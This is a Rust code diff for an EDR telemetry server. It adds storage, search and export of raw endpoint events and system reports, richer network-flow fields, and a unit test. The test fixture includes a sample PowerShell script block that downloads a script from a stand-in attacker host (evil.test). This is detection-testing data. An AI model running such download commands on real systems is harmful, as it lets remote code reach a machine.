@@ -12,6 +12,8 @@ use crate::events::{Event, EventLog};
 const MAX_STORED_BEHAVIORS: usize = 1000;
 const MAX_STORED_FLOWS: usize = 3000;
 const MAX_STORED_THREATS: usize = 500;
+const MAX_STORED_EVENTS: usize = 2000;
+const MAX_STORED_SYSTEM_REPORTS: usize = 200;
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct OpsSummary {
@@ -83,8 +85,18 @@ pub struct NetworkFlowRecord {
     pub dst_ip: String,
     pub dst_port: u16,
     pub protocol: String,
-    #[serde(skip_serializing_if = "Option::is_none")]
+    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub hostname: Option<String>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub dns_query: Option<String>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub url: Option<String>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub http_method: Option<String>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub ja3: Option<String>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub ja3s: Option<String>,
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -101,6 +113,16 @@ pub struct StoredFlow {
     pub dst_port: u16,
     pub protocol: String,
     pub hostname: Option<String>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub dns_query: Option<String>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub url: Option<String>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub http_method: Option<String>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub ja3: Option<String>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub ja3s: Option<String>,
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -135,6 +157,63 @@ pub struct StoredThreat {
     pub pid: Option<u32>,
 }
 
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct EdrEventRecord {
+    #[serde(default)]
+    pub timestamp: u64,
+    #[serde(default)]
+    pub time_iso: String,
+    #[serde(default)]
+    pub event_type: String,
+    #[serde(default)]
+    pub pid: u32,
+    #[serde(default)]
+    pub process_name: String,
+    #[serde(default)]
+    pub exe_path: String,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub details: Option<String>,
+    #[serde(default)]
+    pub raw: serde_json::Value,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct EdrEventBatch {
+    #[serde(default)]
+    pub machine_id: String,
+    #[serde(default)]
+    pub events: Vec<EdrEventRecord>,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct StoredEdrEvent {
+    pub id: u64,
+    pub timestamp: u64,
+    pub time_iso: String,
+    pub machine_id: String,
+    pub event_type: String,
+    pub pid: u32,
+    pub process_name: String,
+    pub exe_path: String,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub details: Option<String>,
+    #[serde(default)]
+    pub raw: serde_json::Value,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct StoredSystemReport {
+    pub id: u64,
+    pub timestamp: u64,
+    pub time_iso: String,
+    pub machine_id: String,
+    pub hostname: String,
+    pub os_version: String,
+    pub monitored_processes_count: usize,
+    pub rootkit_findings_count: usize,
+    pub payload: serde_json::Value,
+}
+
 #[derive(Debug, Clone, Serialize, Deserialize, Default)]
 pub struct EdrStats {
     pub total_behaviors: u64,
@@ -143,6 +222,12 @@ pub struct EdrStats {
     pub clean_behaviors: u64,
     pub total_flows: u64,
     pub total_threats: u64,
+    #[serde(default)]
+    pub total_events: u64,
+    #[serde(default)]
+    pub total_sysops: u64,
+    #[serde(default)]
+    pub total_system_reports: u64,
 }
 
 #[derive(Default)]
@@ -151,6 +236,8 @@ struct EdrStoreInner {
     behaviors: VecDeque<StoredBehavior>,
     flows: VecDeque<StoredFlow>,
     threats: VecDeque<StoredThreat>,
+    events: VecDeque<StoredEdrEvent>,
+    system_reports: VecDeque<StoredSystemReport>,
     stats: EdrStats,
 }
 
@@ -205,12 +292,22 @@ impl EdrTelemetryStore {
             Ok(rows) => inner.threats = rows.into(),
             Err(e) => eprintln!("[EDR] could not read stored threats: {e}"),
         }
+        match db.edr_events(MAX_STORED_EVENTS, None, None, false, None) {
+            Ok(rows) => inner.events = rows.into(),
+            Err(e) => eprintln!("[EDR] could not read stored EDR events: {e}"),
+        }
+        match db.system_reports(MAX_STORED_SYSTEM_REPORTS) {
+            Ok(rows) => inner.system_reports = rows.into(),
+            Err(e) => eprintln!("[EDR] could not read stored system reports: {e}"),
+        }
         // A record that fails to reach the database takes its id from this counter;
         // keep it past the stored ones.
         inner.next_id = [
             inner.behaviors.front().map(|b| b.id),
             inner.flows.front().map(|f| f.id),
             inner.threats.front().map(|t| t.id),
+            inner.events.front().map(|e| e.id),
+            inner.system_reports.front().map(|r| r.id),
         ]
         .into_iter()
         .flatten()
@@ -305,6 +402,11 @@ impl EdrTelemetryStore {
                     dst_port: f.dst_port,
                     protocol: f.protocol.clone(),
                     hostname: f.hostname.clone(),
+                    dns_query: f.dns_query.clone(),
+                    url: f.url.clone(),
+                    http_method: f.http_method.clone(),
+                    ja3: f.ja3.clone(),
+                    ja3s: f.ja3s.clone(),
                 })
                 .collect();
             let stored = match self.db.as_ref().map(|db| db.insert_flows(&mut items)) {
@@ -432,6 +534,11 @@ impl EdrTelemetryStore {
                         || f.protocol.to_lowercase().contains(search)
                         || f.machine_id.to_lowercase().contains(search)
                         || f.hostname.as_deref().map_or(false, |h| h.to_lowercase().contains(search))
+                        || f.dns_query.as_deref().map_or(false, |d| d.to_lowercase().contains(search))
+                        || f.url.as_deref().map_or(false, |u| u.to_lowercase().contains(search))
+                        || f.http_method.as_deref().map_or(false, |m| m.to_lowercase().contains(search))
+                        || f.ja3.as_deref().map_or(false, |j| j.to_lowercase().contains(search))
+                        || f.ja3s.as_deref().map_or(false, |j| j.to_lowercase().contains(search))
                         || f.pid.to_string().contains(search);
                     if !matches {
                         return false;
@@ -456,6 +563,251 @@ impl EdrTelemetryStore {
             Err(_) => return Vec::new(),
         };
         guard.threats.iter().take(limit).cloned().collect()
+    }
+
+    /// Stores lossless raw EDR / SysOps events into SQLite (no dedupe, no pruning)
+    /// and updates the rolling live memory window.
+    pub fn add_edr_events(&self, machine_id: &str, records: &[EdrEventRecord]) -> usize {
+        if records.is_empty() {
+            return 0;
+        }
+        let machine: String = machine_id.chars().take(128).collect();
+        let now_dt = Utc::now();
+        let now_iso = now_dt.to_rfc3339();
+        let now_ts = now_dt.timestamp().max(0) as u64;
+
+        let mut items: Vec<StoredEdrEvent> = records
+            .iter()
+            .filter(|r| !r.event_type.trim().is_empty())
+            .map(|r| {
+                let proc_name = if r.process_name.is_empty() && !r.exe_path.is_empty() {
+                    r.exe_path
+                        .rsplit(['\\', '/'])
+                        .next()
+                        .unwrap_or("")
+                        .to_string()
+                } else {
+                    r.process_name.clone()
+                };
+                StoredEdrEvent {
+                    id: 0,
+                    timestamp: if r.timestamp == 0 { now_ts } else { r.timestamp },
+                    time_iso: if r.time_iso.is_empty() {
+                        now_iso.clone()
+                    } else {
+                        r.time_iso.clone()
+                    },
+                    machine_id: machine.clone(),
+                    event_type: r.event_type.clone(),
+                    pid: r.pid,
+                    process_name: proc_name,
+                    exe_path: r.exe_path.clone(),
+                    details: r.details.clone(),
+                    raw: r.raw.clone(),
+                }
+            })
+            .collect();
+        let count = items.len();
+        if count == 0 {
+            return 0;
+        }
+
+        if let Ok(mut g) = self.inner.write() {
+            let stored = match self.db.as_ref().map(|db| db.insert_edr_events(&mut items)) {
+                Some(Ok(())) => true,
+                Some(Err(e)) => {
+                    eprintln!("[EDR] could not store {count} EDR events in SQLite: {e}");
+                    false
+                }
+                None => false,
+            };
+            let skip_mem = items.len().saturating_sub(MAX_STORED_EVENTS);
+            for (idx, mut item) in items.into_iter().enumerate() {
+                g.stats.total_events += 1;
+                if item.event_type.starts_with("AGENT_") {
+                    g.stats.total_sysops += 1;
+                }
+                if stored {
+                    g.next_id = g.next_id.max(item.id);
+                } else {
+                    g.next_id += 1;
+                    item.id = g.next_id;
+                }
+                if idx >= skip_mem {
+                    g.events.push_front(item);
+                    if g.events.len() > MAX_STORED_EVENTS {
+                        g.events.pop_back();
+                    }
+                }
+            }
+        }
+        count
+    }
+
+    pub fn get_edr_events(
+        &self,
+        limit: usize,
+        event_type: Option<&str>,
+        machine_id: Option<&str>,
+        sysops_only: bool,
+        q: Option<&str>,
+    ) -> Vec<StoredEdrEvent> {
+        let et_clean = event_type.map(str::trim).filter(|s| !s.is_empty());
+        let mach_clean = machine_id.map(str::trim).filter(|s| !s.is_empty());
+        let q_lower = q.map(|s| s.trim().to_lowercase()).filter(|s| !s.is_empty());
+
+        let wants_history = et_clean.is_some()
+            || mach_clean.is_some()
+            || sysops_only
+            || q_lower.is_some()
+            || limit > MAX_STORED_EVENTS;
+        if let Some(db) = self.db.as_ref().filter(|_| wants_history) {
+            match db.edr_events(limit, et_clean, mach_clean, sysops_only, q_lower.as_deref()) {
+                Ok(rows) => return rows,
+                Err(e) => eprintln!("[EDR] EDR event history query failed ({e}); answering from memory"),
+            }
+        }
+
+        let guard = match self.inner.read() {
+            Ok(g) => g,
+            Err(_) => return Vec::new(),
+        };
+        guard
+            .events
+            .iter()
+            .filter(|ev| {
+                if let Some(et) = et_clean {
+                    let matched = et
+                        .split(',')
+                        .map(str::trim)
+                        .filter(|s| !s.is_empty())
+                        .any(|want| ev.event_type.eq_ignore_ascii_case(want));
+                    if !matched {
+                        return false;
+                    }
+                } else if sysops_only && !ev.event_type.starts_with("AGENT_") {
+                    return false;
+                }
+                if let Some(m) = mach_clean {
+                    if ev.machine_id != m {
+                        return false;
+                    }
+                }
+                if let Some(ref search) = q_lower {
+                    let matches = ev.event_type.to_lowercase().contains(search)
+                        || ev.process_name.to_lowercase().contains(search)
+                        || ev.exe_path.to_lowercase().contains(search)
+                        || ev.machine_id.to_lowercase().contains(search)
+                        || ev.pid.to_string().contains(search)
+                        || ev.details.as_deref().map_or(false, |d| d.to_lowercase().contains(search))
+                        || ev.raw.to_string().to_lowercase().contains(search);
+                    if !matches {
+                        return false;
+                    }
+                }
+                true
+            })
+            .take(limit)
+            .cloned()
+            .collect()
+    }
+
+    pub fn export_edr_events(
+        &self,
+        event_type: Option<&str>,
+        machine_id: Option<&str>,
+    ) -> Result<(Vec<u8>, u64), String> {
+        let et_clean = event_type.map(str::trim).filter(|s| !s.is_empty());
+        let mach_clean = machine_id.map(str::trim).filter(|s| !s.is_empty());
+        if let Some(db) = self.db.as_ref() {
+            let mut out = Vec::new();
+            let n = db
+                .export_edr_events(et_clean, mach_clean, &mut out)
+                .map_err(|e| e.to_string())?;
+            return Ok((out, n));
+        }
+        let guard = self.inner.read().map_err(|_| "store lock poisoned".to_string())?;
+        let mut out = Vec::new();
+        let mut n = 0u64;
+        for ev in guard.events.iter().rev() {
+            if et_clean.is_some_and(|et| !ev.event_type.eq_ignore_ascii_case(et)) {
+                continue;
+            }
+            if mach_clean.is_some_and(|m| ev.machine_id != m) {
+                continue;
+            }
+            if serde_json::to_writer(&mut out, ev).is_ok() {
+                out.push(b'\n');
+                n += 1;
+            }
+        }
+        Ok((out, n))
+    }
+
+    pub fn add_system_report(&self, payload: &serde_json::Value) -> StoredSystemReport {
+        let now_dt = Utc::now();
+        let machine_id = payload
+            .get("machine_id")
+            .and_then(|v| v.as_str())
+            .unwrap_or("unknown")
+            .chars()
+            .take(128)
+            .collect::<String>();
+        let time_iso = payload
+            .get("timestamp")
+            .and_then(|v| v.as_str())
+            .filter(|s| !s.is_empty())
+            .map(str::to_string)
+            .unwrap_or_else(|| now_dt.to_rfc3339());
+        let mut item = StoredSystemReport {
+            id: 0,
+            timestamp: now_dt.timestamp().max(0) as u64,
+            time_iso,
+            machine_id,
+            hostname: payload
+                .get("hostname")
+                .and_then(|v| v.as_str())
+                .unwrap_or("")
+                .to_string(),
+            os_version: payload
+                .get("os_version")
+                .and_then(|v| v.as_str())
+                .unwrap_or("")
+                .to_string(),
+            monitored_processes_count: payload
+                .get("monitored_processes_count")
+                .and_then(|v| v.as_u64())
+                .unwrap_or(0) as usize,
+            rootkit_findings_count: payload
+                .get("rootkit_findings_count")
+                .and_then(|v| v.as_u64())
+                .unwrap_or(0) as usize,
+            payload: payload.clone(),
+        };
+        if let Ok(mut g) = self.inner.write() {
+            let written = self.db.as_ref().map(|db| db.insert_system_report(&item));
+            item.id = Self::assign_id(&mut g, written, "a system report");
+            g.stats.total_system_reports += 1;
+            g.system_reports.push_front(item.clone());
+            if g.system_reports.len() > MAX_STORED_SYSTEM_REPORTS {
+                g.system_reports.pop_back();
+            }
+        }
+        item
+    }
+
+    pub fn get_system_reports(&self, limit: usize) -> Vec<StoredSystemReport> {
+        if let Some(db) = self.db.as_ref().filter(|_| limit > MAX_STORED_SYSTEM_REPORTS) {
+            match db.system_reports(limit) {
+                Ok(rows) => return rows,
+                Err(e) => eprintln!("[EDR] system report history query failed ({e}); answering from memory"),
+            }
+        }
+        let guard = match self.inner.read() {
+            Ok(g) => g,
+            Err(_) => return Vec::new(),
+        };
+        guard.system_reports.iter().take(limit).cloned().collect()
     }
 }
 
@@ -607,10 +959,16 @@ pub fn ingest_flows(store: &EdrTelemetryStore, events: &EventLog, batch: &Networ
 
     // Log sample flows in EventLog (at most 5 to avoid flooding)
     for flow in batch.flows.iter().take(5) {
-        let detail_str = format!(
+        let mut detail_str = format!(
             "{}:{} -> {}:{} ({})",
             flow.src_ip, flow.src_port, flow.dst_ip, flow.dst_port, flow.protocol
         );
+        if let Some(ref dns) = flow.dns_query {
+            detail_str.push_str(&format!(" dns={dns}"));
+        }
+        if let Some(ref u) = flow.url {
+            detail_str.push_str(&format!(" url={u}"));
+        }
 
         events.add(Event {
             seq: 0,
@@ -623,7 +981,11 @@ pub fn ingest_flows(store: &EdrTelemetryStore, events: &EventLog, batch: &Networ
             size: None,
             ms: None,
             items: None,
-            threat: flow.hostname.clone(),
+            threat: flow
+                .url
+                .clone()
+                .or_else(|| flow.dns_query.clone())
+                .or_else(|| flow.hostname.clone()),
             detail: Some(detail_str),
             sha256: None,
             message: Some(format!("Host:{}", batch.machine_id)),
@@ -674,30 +1036,56 @@ pub async fn handle_edr_telemetry_report(
     State(app): State<Arc<AppState>>,
     Json(payload): Json<serde_json::Value>,
 ) -> impl IntoResponse {
-    Json(ingest_system_report(&app.events, &payload))
+    Json(ingest_system_report(&app.edr_telemetry, &app.events, &payload))
 }
 
-/// Records a system diagnostic report (live feed). Shared by the dashboard's
-/// /api/v1/edr/telemetry/report and the public /api/v1/edr/telemetry/system.
-pub fn ingest_system_report(events: &EventLog, payload: &serde_json::Value) -> serde_json::Value {
-    let host = payload
-        .get("machine_id")
-        .and_then(|v| v.as_str())
-        .unwrap_or("unknown");
+/// Records a system diagnostic report (full SQLite persistence + AGENT_KEEPALIVE SysOp
+/// + live feed). Shared by the dashboard's /api/v1/edr/telemetry/report and public /api/v1/edr/telemetry/system.
+pub fn ingest_system_report(
+    store: &EdrTelemetryStore,
+    events: &EventLog,
+    payload: &serde_json::Value,
+) -> serde_json::Value {
+    let stored = store.add_system_report(payload);
+    let keepalive_detail = format!(
+        "hostname={} os={} processes={} rootkit_findings={}",
+        stored.hostname, stored.os_version, stored.monitored_processes_count, stored.rootkit_findings_count
+    );
+    store.add_edr_events(
+        &stored.machine_id,
+        &[EdrEventRecord {
+            timestamp: stored.timestamp,
+            time_iso: stored.time_iso.clone(),
+            event_type: "AGENT_KEEPALIVE".to_string(),
+            pid: 0,
+            process_name: "edrsvc.exe".to_string(),
+            exe_path: String::new(),
+            details: Some(keepalive_detail.clone()),
+            raw: serde_json::json!({
+                "hostname": stored.hostname,
+                "os_version": stored.os_version,
+                "monitored_processes_count": stored.monitored_processes_count,
+                "rootkit_findings_count": stored.rootkit_findings_count,
+            }),
+        }],
+    );
 
     events.add(Event {
         seq: 0,
         time: Utc::now(),
         kind: "edr_report".to_string(),
         session: None,
-        client: Some(host.to_string()),
+        client: Some(stored.machine_id.clone()),
         verdict: Some("info".to_string()),
         file: Some("System Diagnostic Report".to_string()),
         size: None,
         ms: None,
         items: None,
         threat: None,
-        detail: Some(format!("System diagnostic report from {}", host)),
+        detail: Some(format!(
+            "System diagnostic report from {} ({keepalive_detail})",
+            stored.machine_id
+        )),
         sha256: None,
         message: None,
         origin_type: Some("EDR-Diagnostic".to_string()),
@@ -705,6 +1093,7 @@ pub fn ingest_system_report(events: &EventLog, payload: &serde_json::Value) -> s
 
     serde_json::json!({
         "status": "ok",
+        "report_id": stored.id,
         "need_sample": false,
         "message": "Diagnostic report received"
     })
@@ -796,8 +1185,28 @@ pub async fn handle_get_edr_threats(
 
 /// Decompressed size a kill chain upload may have.
 pub const KILLCHAIN_MAX_JSON_BYTES: u64 = 64 * 1024 * 1024;
+/// Decompressed size a raw EDR telemetry batch may have.
+pub const EVENTS_MAX_JSON_BYTES: u64 = 128 * 1024 * 1024;
 /// Records / repeat counts one upload may carry.
 const KILLCHAIN_MAX_ITEMS: usize = 20_000;
+
+fn decode_body_bounded(body: &[u8], brotli: bool, max_bytes: u64) -> Result<Vec<u8>, String> {
+    use std::io::Read;
+    let mut out = Vec::new();
+    let limit = max_bytes + 1;
+    let n = if brotli {
+        brotli_decompressor::Decompressor::new(body, 4096)
+            .take(limit)
+            .read_to_end(&mut out)
+            .map_err(|e| format!("brotli decompression failed: {e}"))?
+    } else {
+        body.take(limit).read_to_end(&mut out).map_err(|e| e.to_string())?
+    };
+    if n as u64 > max_bytes {
+        return Err(format!("upload larger than {} MB decompressed", max_bytes / (1024 * 1024)));
+    }
+    Ok(out)
+}
 
 #[derive(Debug, Deserialize)]
 pub struct KillchainRecord {
@@ -840,21 +1249,49 @@ fn valid_killchain_key(k: &str) -> bool {
 /// The request body as JSON bytes: brotli-decoded when `brotli`, never more than
 /// `KILLCHAIN_MAX_JSON_BYTES` (a decompression bomb stops there).
 pub fn killchain_body(body: &[u8], brotli: bool) -> Result<Vec<u8>, String> {
-    use std::io::Read;
-    let mut out = Vec::new();
-    let limit = KILLCHAIN_MAX_JSON_BYTES + 1;
-    let n = if brotli {
-        brotli_decompressor::Decompressor::new(body, 4096)
-            .take(limit)
-            .read_to_end(&mut out)
-            .map_err(|e| format!("brotli decompression failed: {e}"))?
-    } else {
-        body.take(limit).read_to_end(&mut out).map_err(|e| e.to_string())?
-    };
-    if n as u64 > KILLCHAIN_MAX_JSON_BYTES {
-        return Err("upload larger than 64 MB decompressed".into());
+    decode_body_bounded(body, brotli, KILLCHAIN_MAX_JSON_BYTES)
+}
+
+/// The raw EDR events body as JSON bytes: brotli-decoded when `brotli`, bounded by `EVENTS_MAX_JSON_BYTES`.
+pub fn decode_events_body(body: &[u8], brotli: bool) -> Result<Vec<u8>, String> {
+    decode_body_bounded(body, brotli, EVENTS_MAX_JSON_BYTES)
+}
+
+/// Records a lossless batch of raw EDR & SysOps events into persistent SQLite storage.
+pub fn ingest_edr_events(
+    store: &EdrTelemetryStore,
+    events: &EventLog,
+    batch: &EdrEventBatch,
+) -> serde_json::Value {
+    let ingested = store.add_edr_events(&batch.machine_id, &batch.events);
+    for rec in batch.events.iter().filter(|r| r.event_type.starts_with("AGENT_")) {
+        let msg = rec.details.as_deref().unwrap_or("");
+        events.add(Event {
+            seq: 0,
+            time: Utc::now(),
+            kind: "edr_sysop".to_string(),
+            session: None,
+            client: Some(batch.machine_id.clone()),
+            verdict: Some(if rec.event_type == "AGENT_ERROR" {
+                "error".to_string()
+            } else {
+                "info".to_string()
+            }),
+            file: Some(rec.event_type.clone()),
+            size: None,
+            ms: None,
+            items: None,
+            threat: None,
+            detail: if msg.is_empty() { None } else { Some(msg.to_string()) },
+            sha256: None,
+            message: Some(format!("[EDR:SysOp] {} ({}) {}", rec.event_type, batch.machine_id, msg)),
+            origin_type: Some("EDR-SysOp".to_string()),
+        });
     }
-    Ok(out)
+    serde_json::json!({
+        "status": "ok",
+        "ingested": ingested
+    })
 }
 
 impl EdrTelemetryStore {
@@ -960,6 +1397,119 @@ pub async fn handle_get_killchain_machines(State(app): State<Arc<AppState>>) -> 
         Ok(Err(e)) => (axum::http::StatusCode::SERVICE_UNAVAILABLE, e).into_response(),
         Err(e) => (axum::http::StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
     }
+}
+
+#[derive(Debug, Deserialize)]
+pub struct EdrEventsQuery {
+    pub limit: Option<usize>,
+    pub event_type: Option<String>,
+    pub machine_id: Option<String>,
+    pub sysops: Option<bool>,
+    pub q: Option<String>,
+}
+
+#[derive(Debug, Deserialize)]
+pub struct EdrEventsExportQuery {
+    pub event_type: Option<String>,
+    pub machine_id: Option<String>,
+}
+
+/// Handler for POST /api/v1/edr/telemetry/events (dashboard route; supports Brotli & plain JSON).
+pub async fn handle_edr_telemetry_events(
+    State(app): State<Arc<AppState>>,
+    headers: axum::http::HeaderMap,
+    body: axum::body::Bytes,
+) -> axum::response::Response {
+    let brotli = headers
+        .get("content-encoding")
+        .and_then(|v| v.to_str().ok())
+        .is_some_and(|v| v.eq_ignore_ascii_case("br") || v.eq_ignore_ascii_case("brotli"));
+    let store = Arc::clone(&app.edr_telemetry);
+    let events = Arc::clone(&app.events);
+    let res = tokio::task::spawn_blocking(move || {
+        let json = decode_events_body(&body, brotli).map_err(|e| (axum::http::StatusCode::BAD_REQUEST, e))?;
+        let batch: EdrEventBatch =
+            serde_json::from_slice(&json).map_err(|e| (axum::http::StatusCode::BAD_REQUEST, format!("bad JSON: {e}")))?;
+        Ok::<_, (axum::http::StatusCode, String)>(ingest_edr_events(&store, &events, &batch))
+    })
+    .await;
+    match res {
+        Ok(Ok(v)) => Json(v).into_response(),
+        Ok(Err((st, e))) => (st, Json(serde_json::json!({"status": "error", "error": e}))).into_response(),
+        Err(e) => (axum::http::StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
+    }
+}
+
+/// Handler for GET /api/v1/edr/telemetry/events
+pub async fn handle_get_edr_events(
+    State(app): State<Arc<AppState>>,
+    Query(query): Query<EdrEventsQuery>,
+) -> axum::response::Response {
+    let limit = query.limit.unwrap_or(200).min(5000);
+    let store = Arc::clone(&app.edr_telemetry);
+    let et = query.event_type;
+    let mach = query.machine_id;
+    let sysops = query.sysops.unwrap_or(false);
+    let q = query.q;
+    match tokio::task::spawn_blocking(move || {
+        store.get_edr_events(limit, et.as_deref(), mach.as_deref(), sysops, q.as_deref())
+    })
+    .await
+    {
+        Ok(items) => Json(serde_json::json!({
+            "total": items.len(),
+            "events": items
+        }))
+        .into_response(),
+        Err(e) => (axum::http::StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
+    }
+}
+
+/// Handler for GET /api/v1/edr/telemetry/events/export (full lossless NDJSON download).
+pub async fn handle_export_edr_events(
+    State(app): State<Arc<AppState>>,
+    Query(query): Query<EdrEventsExportQuery>,
+) -> axum::response::Response {
+    let store = Arc::clone(&app.edr_telemetry);
+    let et = query.event_type.filter(|s| !s.trim().is_empty());
+    let mach = query.machine_id.filter(|s| !s.trim().is_empty());
+    let file_name = match &mach {
+        Some(m) => {
+            let safe: String = m
+                .chars()
+                .filter(|c| c.is_ascii_alphanumeric() || *c == '-' || *c == '_')
+                .take(64)
+                .collect();
+            format!("attachment; filename=\"edr_events_{safe}.jsonl\"")
+        }
+        None => "attachment; filename=\"edr_events.jsonl\"".to_string(),
+    };
+    let result = tokio::task::spawn_blocking(move || store.export_edr_events(et.as_deref(), mach.as_deref())).await;
+    match result {
+        Ok(Ok((body, _))) => (
+            [
+                (axum::http::header::CONTENT_TYPE, "application/x-ndjson".to_string()),
+                (axum::http::header::CONTENT_DISPOSITION, file_name),
+            ],
+            body,
+        )
+            .into_response(),
+        Ok(Err(e)) => (axum::http::StatusCode::SERVICE_UNAVAILABLE, e).into_response(),
+        Err(e) => (axum::http::StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
+    }
+}
+
+/// Handler for GET /api/v1/edr/telemetry/system-reports
+pub async fn handle_get_system_reports(
+    State(app): State<Arc<AppState>>,
+    Query(query): Query<TelemetryQuery>,
+) -> impl IntoResponse {
+    let limit = query.limit.unwrap_or(50).min(500);
+    let items = app.edr_telemetry.get_system_reports(limit);
+    Json(serde_json::json!({
+        "total": items.len(),
+        "reports": items
+    }))
 }
 
 /// Handler for GET /api/v1/edr/telemetry/killchain/export: the kill chain training
@@ -1125,6 +1675,11 @@ mod tests {
             dst_port: 443,
             protocol: "TCP".to_string(),
             hostname: None,
+            dns_query: None,
+            url: None,
+            http_method: None,
+            ja3: None,
+            ja3s: None,
         }
     }
 
@@ -1186,5 +1741,125 @@ mod tests {
         assert_eq!(body["need_sample"], false);
         let stats = store.get_stats();
         assert_eq!((stats.malicious_behaviors, stats.suspicious_behaviors, stats.clean_behaviors), (0, 1, 0));
+    }
+
+    #[test]
+    fn lossless_edr_events_and_system_reports_persist_and_search_without_dedupe() {
+        let path = tmp_db("lossless_events");
+        {
+            let store = EdrTelemetryStore::open(&path);
+            let events = EventLog::new(false);
+            let dup = EdrEventRecord {
+                timestamp: 1700000001,
+                time_iso: "2026-11-25T10:00:01Z".to_string(),
+                event_type: "LLE_FILE_CREATE".to_string(),
+                pid: 4242,
+                process_name: "notepad.exe".to_string(),
+                exe_path: r"C:\Windows\System32\notepad.exe".to_string(),
+                details: Some(r"[File: C:\Users\alice\doc.txt]".to_string()),
+                raw: serde_json::json!({
+                    "file": { "path": r"C:\Users\alice\doc.txt", "sha256": "deadbeef" },
+                    "kernelStackSymbols": "ntoskrnl.exe!NtCreateFile+0x1"
+                }),
+            };
+            let batch = EdrEventBatch {
+                machine_id: "machine-1".to_string(),
+                events: vec![
+                    dup.clone(),
+                    dup,
+                    EdrEventRecord {
+                        timestamp: 1700000002,
+                        time_iso: "2026-11-25T10:00:02Z".to_string(),
+                        event_type: "AGENT_START".to_string(),
+                        pid: 100,
+                        process_name: "edrsvc.exe".to_string(),
+                        exe_path: r"C:\Program Files\HydraDragonAntivirus\OpenEDR\edrsvc.exe".to_string(),
+                        details: Some("service started".to_string()),
+                        raw: serde_json::json!({"version": "1.2"}),
+                    },
+                ],
+            };
+            let resp = ingest_edr_events(&store, &events, &batch);
+            assert_eq!(resp["ingested"], 3);
+
+            // NetworkFlowRecord carries dns_query, url, http_method cleanly
+        let mut f = flow("93.184.216.34");
+            f.dns_query = Some("example.org".to_string());
+            f.url = Some("https://example.org/payload.exe".to_string());
+            f.http_method = Some("GET".to_string());
+            f.ja3 = Some("e7d705a3286e19ea42f587b344ee6865".to_string());
+            f.ja3s = Some("ec74a5c51106f0419184d0dd08905735".to_string());
+            store.add_flows("machine-1", &[f]);
+
+            // Phase 2 raw event: ScriptBlock + PE Hashes
+            let ps_ev = EdrEventRecord {
+                timestamp: 1700000004,
+                time_iso: "2026-11-25T10:00:04Z".to_string(),
+                event_type: "SCRIPT_BLOCK_ACTIVITY".to_string(),
+                pid: 888,
+                process_name: "powershell.exe".to_string(),
+                exe_path: r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe".to_string(),
+                details: Some("ScriptBlockText=Invoke-WebRequest".to_string()),
+                raw: serde_json::json!({
+                    "ScriptBlockText": "Invoke-WebRequest https://evil.test/a.ps1",
+                    "hashes": { "md5": "00112233445566778899aabbccddeeff", "imphash": "11223344556677889900aabbccddeeff" }
+                }),
+            };
+            ingest_edr_events(
+                &store,
+                &events,
+                &EdrEventBatch {
+                    machine_id: "machine-1".to_string(),
+                    events: vec![ps_ev],
+                },
+            );
+
+            // ingest_system_report stores system_reports + AGENT_KEEPALIVE
+            let sys_resp = ingest_system_report(
+                &store,
+                &events,
+                &serde_json::json!({
+                    "machine_id": "machine-1",
+                    "timestamp": "2026-11-25T10:00:05Z",
+                    "hostname": "WS-01",
+                    "os_version": "Windows 11",
+                    "monitored_processes_count": 42,
+                    "rootkit_findings_count": 0,
+                    "processes": []
+                }),
+            );
+            assert_eq!(sys_resp["status"], "ok");
+        }
+
+        // Reopen DB and verify everything survived with exact totals
+        let store = EdrTelemetryStore::open(&path);
+        let stats = store.get_stats();
+        assert_eq!(stats.total_events, 5, "2 duplicate LLE + AGENT_START + SCRIPT_BLOCK_ACTIVITY + AGENT_KEEPALIVE");
+        assert_eq!(stats.total_sysops, 2, "AGENT_START + AGENT_KEEPALIVE");
+        assert_eq!(stats.total_system_reports, 1);
+
+        let all = store.get_edr_events(20, None, None, false, None);
+        assert_eq!(all.len(), 5);
+        assert_eq!(store.get_edr_events(20, Some("LLE_FILE_CREATE"), None, false, None).len(), 2);
+        assert_eq!(store.get_edr_events(20, Some("LLE_FILE_CREATE,SCRIPT_BLOCK_ACTIVITY"), None, false, None).len(), 3);
+        assert_eq!(store.get_edr_events(20, None, None, true, None).len(), 2);
+        assert_eq!(store.get_edr_events(20, None, None, false, Some("deadbeef")).len(), 2);
+        assert_eq!(store.get_edr_events(20, None, None, false, Some("11223344556677889900aabbccddeeff")).len(), 1);
+        assert_eq!(store.get_edr_events(20, None, None, false, Some("invoke-webrequest")).len(), 1);
+
+        let (exported, n) = store.export_edr_events(None, Some("machine-1")).unwrap();
+        assert_eq!(n, 5);
+        assert_eq!(std::str::from_utf8(&exported).unwrap().lines().count(), 5);
+
+        let flows = store.get_flows(10, Some("e7d705a3286e19ea42f587b344ee6865"));
+        assert_eq!(flows.len(), 1);
+        assert_eq!(flows[0].dns_query.as_deref(), Some("example.org"));
+        assert_eq!(flows[0].http_method.as_deref(), Some("GET"));
+        assert_eq!(flows[0].ja3s.as_deref(), Some("ec74a5c51106f0419184d0dd08905735"));
+
